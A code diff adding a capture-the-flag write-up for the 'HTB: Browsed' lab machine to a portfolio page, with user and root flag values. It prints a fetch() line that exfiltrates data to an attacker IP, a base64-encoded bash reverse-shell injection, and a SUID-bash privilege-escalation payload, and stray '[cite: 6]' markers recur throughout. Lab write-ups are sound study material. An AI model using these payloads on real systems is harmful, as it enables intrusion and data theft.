@@ -289,7 +289,28 @@
           <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
-
+      <!-- CARD: Browsed -->
+            <div id="browsed" class="bento-box wide" tabindex="0"
+                 style="cursor:pointer; padding:0;"
+                 data-difficulty="medium" data-tags="linux,browser-extension,ssrf,python-cache,privesc" data-machine="browsed"
+                 onclick="openDrawer(this,'browsed')"
+                 onkeydown="if(event.key==='Enter')openDrawer(this,'browsed')">
+              <div class="wu-accent medium"></div>
+              <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
+                <div>
+                  <img src="Browsed/Screenshot_1448-05-17_at_6.00.33_PM.png" alt="Browsed writeup screenshot" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
+                  <div class="box-meta">
+                    <span class="tag">Linux / Browser Extension</span>
+                    <span style="font-size:0.85rem;color:var(--neon-cyan);">
+                      <span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium
+                    </span>
+                  </div>
+                  <div class="box-title">HTB: Browsed</div>
+                  <div class="box-desc">Medium-difficulty Linux machine featuring a malicious Chrome extension upload, SSRF via background service workers, Bash arithmetic injection for a user shell, and Python bytecode cache poisoning for root escalation[cite: 6].</div>
+                </div>
+                <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
+              </div>
+            </div>
       <!-- CARD: Facts -->
       <div id="facts" class="bento-box wide" tabindex="0"
            style="cursor:pointer; padding:0;"
@@ -578,7 +599,70 @@
         { name: "Root Flag", value: "110" }
       ]
     },
-   
+       browsed: {
+        title: "HTB: Browsed",
+        badge: "Linux // Medium",
+        icon: "Browsed/Screenshot_1448-05-17_at_6.00.33_PM.png",
+        os: "Linux",
+        diff: "Medium",
+        diffColor: "var(--neon-cyan)",
+        port: "22, 80",
+        time: "⚠️ 3h 15m",
+        vector: "RustScan → Nmap → Extension Upload → Gitea API Enum → Flask SSRF → Background Service Worker → Bash Arithmetic Injection → Python Bytecode Cache Poisoning → SUID Root Bash",
+        hasFullWriteup: true,
+        nodes: [
+          {
+            phase: "RECONNAISSANCE",
+            title: "Port Scanning & Service Mapping",
+            body: "Fired up rustscan and a thorough nmap scan against the target[cite: 6]. Found SSH (22) and an Nginx webserver running on port 80[cite: 6]. Mapping out `browsed.htb` showed an application portal built entirely around uploading and previewing custom Chrome extensions[cite: 6].",
+            code: "ip=10.129.244.79\nrustscan -a $ip\nnmap -sCV -p- -oN output.txt $ip"
+          },
+          {
+            phase: "INTERNAL DISCOVERY",
+            title: "Gitea API Discovery & Repository Audit",
+            body: "Uploaded a couple of sample extensions and dug straight into the application logs[cite: 6]. That's where an internal domain (`browsedinternals.htb`) popped up running a self-hosted Gitea instance[cite: 6]. Instead of stumbling through web UI links, I queried the Gitea API directly to pull down the `MarkdownPreview` repository structure, revealing a local Flask app (`app.py`) and a routine manager (`routines.sh`)[cite: 6].",
+            code: "curl -s \"http://browsedinternals.htb/api/v1/repos/larry/MarkdownPreview/git/trees/main?recursive=true\" | jq -r '.tree[].path'"
+          },
+          {
+            phase: "⚠️ THE RABBIT HOLES",
+            title: "The Content Script Dead End (1.5 Hours Wasted)",
+            body: "My initial instinct was to build a standard extension content script to read `http://localhost:5000`. Huge mistake—browser CORS policies completely blocked it from interacting with the local DOM or hitting loopback endpoints. \n\n![HIMYM Barney Stinson frustration gif](https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif)\n\nI spun my wheels testing different XSS-style script injections before realizing extensions require a **Background Service Worker** explicitly listed in `host_permissions` to bypass CORS and securely query internal services[cite: 6]."
+          },
+          {
+            phase: "FOOTHOLD",
+            title: "Chrome Extension SSRF & Background Worker Payload",
+            body: "Pivoted my approach completely. Crafted a clean extension using a background service worker configured with broad host permissions for `127.0.0.1` and `localhost`[cite: 6]. This served as my ultimate SSRF primitive, allowing the developer's browser context to silently fetch the hidden Flask app running on port 5000 and exfiltrate the rendered response back to my listener[cite: 6].",
+            code: "fetch(\"http://localhost:5000/\")\n  .then(r => r.text())\n  .then(d => fetch(\"http://10.10.14.154:8000/?d=\" + btoa(d)));"
+          },
+          {
+            phase: "INITIAL ACCESS",
+            title: "Bash Arithmetic Injection to User Shell",
+            body: "Analyzing the retrieved Flask app code showed it called a companion bash script (`routines.sh`) that handled routine IDs using numeric comparisons with `-eq`[cite: 6]. Knowing how Bash arithmetic evaluation handles array subscripts, I realized this was prime injection real estate. I injected a command substitution payload right into the routine parameter to execute base64-encoded instructions, spawning a clean reverse shell as `larry`[cite: 6].",
+            code: "fetch('http://127.0.0.1:5000/routines/a[$(base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTQvOTAwMiAwPiYx==|bash)]+100');"
+          },
+          {
+            phase: "PRIVILEGE ESCALATION",
+            title: "Mastering Python Bytecode (.pyc) Cache Poisoning",
+            body: "Ran `sudo -l` and found permission to execute `/opt/extensiontool/extension_tool.py` as root[cite: 6]. Investigating the source revealed it imported functions from `extension_utils.py`, and crucially, the `__pycache__` directory had wide-open permissions[cite: 6]. \n\n*What is a `.pyc` file?* When Python imports a module, it compiles it into bytecode stored inside a `__pycache__` folder. The file begins with a 16-byte header containing a Python version magic number, flags, the source file's original modification timestamp (`mtime`), and file size. Python checks freshness *strictly* by comparing the cached `.pyc` timestamp/size against the real source file. If they match, it blindly executes the cached bytecode without verifying the source text.\n\n![Harry Potter magic wand spell casting gif](https://media.giphy.com/media/8v6Z3YyULB5Q0Skbac/giphy.gif)\n\nShoutout to **HardSoftSecurity** and their incredible write-up on Python Cache Poisoning[cite: 6]. Following their methodology, I compiled a custom malicious script (`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`) into bytecode, wrote a Python spoofing script to extract the exact `mtime` and size of the real `extension_utils.py`, and rebuilt a valid `.pyc` header containing my malicious code.",
+            code: "# Compiling & Poisoning Flow\npython3 -m py_compile exploit.py\npython3.12 poison3.py"
+          },
+          {
+            phase: "ROOT COMPROMISE",
+            title: "Triggering the Poisoned Module & Flag Capture",
+            body: "With the cache successfully poisoned to match the exact size and timestamp of the legitimate module, I executed the permitted sudo tool[cite: 6]. Instead of running the original code, Python trusted the poisoned bytecode and executed my payload as root[cite: 6]. Checked `/tmp/rootbash`—the SUID bit was successfully set[cite: 6]. Dropped into a root shell with `-p` and grabbed both flags[cite: 6].",
+            code: "sudo /opt/extensiontool/extension_tool.py --help\nls -la /tmp/rootbash\n/tmp/rootbash -p"
+          },
+          {
+            phase: "LESSONS LEARNED",
+            title: "Key Takeaways",
+            body: "1) Browser extension background service workers are lethal for bypassing CORS during internal network pivots. 2) Never trust numeric `-eq` comparisons in Bash scripts—they are prime real estate for arithmetic command injection. 3) Writable `__pycache__` folders are a goldmine for Python privilege escalation if you respect the 16-byte bytecode header structure and match the file's modification timestamp."
+          }
+        ],
+        flags: [
+          { name: "User Flag", value: "01c3b409e91d4226633ec89ca1fee4c3" },
+          { name: "Root Flag", value: "74db7be127b01fa460124c1e55453abb" }
+        ]
+      },
       apt: {
       title: "HTB: APT",
       badge: "Windows // Insane",
